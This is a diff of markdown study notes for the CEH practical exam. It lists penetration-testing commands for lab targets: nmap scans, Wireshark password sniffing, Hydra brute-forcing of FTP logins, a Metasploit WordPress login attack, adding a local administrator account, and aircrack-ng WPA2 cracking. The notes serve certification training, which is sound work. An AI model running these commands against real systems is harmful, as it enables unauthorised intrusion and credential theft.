@@ -6,16 +6,30 @@ description: A set of preparation notes for CEH practical
 
 ## Scanning Networks (always do sudo su) --> To be root
 
+#### Nmap scan for alive/active hosts
+
 ```
-1- Nmap scan for alive/active hosts command for 192.189.19.18- nmap -A 192.189.19.0/24 or nmap -T4 -A ip
-2- Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command- nmap -sT -v 10.10.10.16
-3- Nmap scan if firewall/IDS is opened, half scan- nmap -sS -v 10.10.10.16 
-If even this the above command is not working then use this command-  namp -f 10.10.10.16
-4- -A command is aggressive scan it includes - OS detection (-O), Version (-sV), Script (-sS) and traceroute (--traceroute).
-5- Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
-6- Nmap scan for host discovery or OS- nmap -O 192.168.92.10 or you can use nmap -A 192.168.92.10
-7- If host is windows then use this command - nmap --script smb-os-discovery.nse 192.168.12.22 (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
-8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.10.10.10
+nmap -A 192.189.19.0/24
+nmap -T4 -A 192.189.19.0/24
+nmap -f 10.10.10.16
+```
+
+The `-A` flag is for an aggressive scan it includes: OS detection (`-O`), Version (`-sV`), Script (`-sC`) and traceroute (`--traceroute`).&#x20;
+
+If the host is Windows then use this command:
+
+```
+nmap --script smb-os-discovery.nse 192.168.12.22 
+```
+
+The above script determines the OS, computer name, domain, workgroup, and time over smb protocol (ports 445 or 139).
+
+#### nmap command for source port manipulation
+
+In this, the port is given or we use a common port&#x20;
+
+```
+nmap -g 80 10.10.10.10
 ```
 
 ## Enumeration
@@ -84,33 +98,60 @@ snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt con
 
 ## Sniffing
 
-```
-1- Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
-```
+### Password Sniffing using Wireshark&#x20;
+
+In pcap file apply the filter: `http.request.method==POST` (you will get all the post requests)&#x20;
+
+Now to capture the password click on edit in the menu bar, then near the "Find packet" section, on the "display filter" select "string", also select "Packet details" from the drop-down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
 
 ## Hacking Web Servers
 
-```
-1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
-						    GET /HTTP/1.0
-						    telnet www.movies.com 80
-						    GET /HTTP/1.0
-2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
-3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
-				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
+### Footprinting web server Using Netcat and Telnet:&#x20;
+
+nc -vv www.movies.com 80
+
+GET /HTTP/1.0
+
+telnet www.movies.com 80
+
+GET /HTTP/1.0
+
+### Enumerate Web server info using nmap &#x20;
+
+nmap -sV --script=http-enum www.movies.com
+
+### Crack FTP credentials using nmap &#x20;
+
+nmap -p 21 10.10.10.10&#x20;
+
+Check if FTP port is open or not
+
+ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
+
 Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
-Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
+
+Now in terminal type: &#x20;
+
+hydra -L /home/attacker/Desktop/CEH\_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH\_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
 
 hydra -l user -P passlist.txt ftp://10.10.10.10
-```
 
 ## Hacking Web Application
 
+### Scan Using OWASP ZAP (Parrot)&#x20;
+
+Type zaproxy in the terminal and then it will open. In the target tab put the url and click automated scan.
+
+### Directory Bruteforcing&#x20;
+
+gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
+
+### Enumerate a Web Application using WPscan &#x20;
+
+wpscan --url http://10.10.10.10:8080/NEW --enumerate username  &#x20;
+
 ```
-1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
-2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
-3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username) 
-Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
+Then type msfconsole to open metasploit. Type -  use auxiliary/scanner/http/wordpress_login_enum
  						 show options
 						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
 						 set RHOSTS 10.10.10.10  (target ip)
@@ -125,7 +166,7 @@ Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wor
 		       | net user Test      (Check a user)
 		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
 		       | net user Test      (Once again check to see if it has become administrator)
-Now you can do a RDP connection with the given ip and the Test account which you created.
+Now you can do an RDP connection with the given ip and the Test account which you created.
 ```
 
 ## SQL Injections
@@ -165,21 +206,25 @@ Also
 ## Find FQDN
 
 ```
-nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
+nmap -p389 –sV -iL <target_list>  
+nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
 ```
 
 ## Cracking Wi-Fi networks
 
+{% code overflow="wrap" %}
 ```
-Cracking Wifi Password
 aircrack-ng [pcap file] (For cracking WEP network)
 aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)
 
 ```
+{% endcode %}
 
 ## Health Checks
 
+{% code overflow="wrap" %}
 ```
-Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
+the Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from the target subnet)
 Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
 ```
+{% endcode %}
